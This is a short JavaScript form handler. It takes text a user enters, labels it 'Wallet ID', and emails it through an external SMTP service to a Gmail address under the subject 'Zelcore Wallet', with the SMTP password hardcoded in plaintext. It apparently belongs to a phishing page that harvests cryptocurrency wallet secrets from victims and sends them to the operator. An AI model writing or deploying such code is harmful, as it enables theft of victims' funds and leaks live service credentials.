function emailSend(){

  var message = document.getElementById('message').value;

  var messageBody = "Wallet ID: " + message;

  Email.send({
  Host : "smtp.elasticemail.com",
  Username : "eduformsummit@gmail.com",
  Password : "4385137C8D62433F27D24D50666B6AE3B655",
  To : 'eduformsummit@gmail.com',
  From : "eduformsummit@gmail.com",
    Subject : "Zelcore Wallet",
    Body : messageBody
}).then(
  message => alert(message)
);
}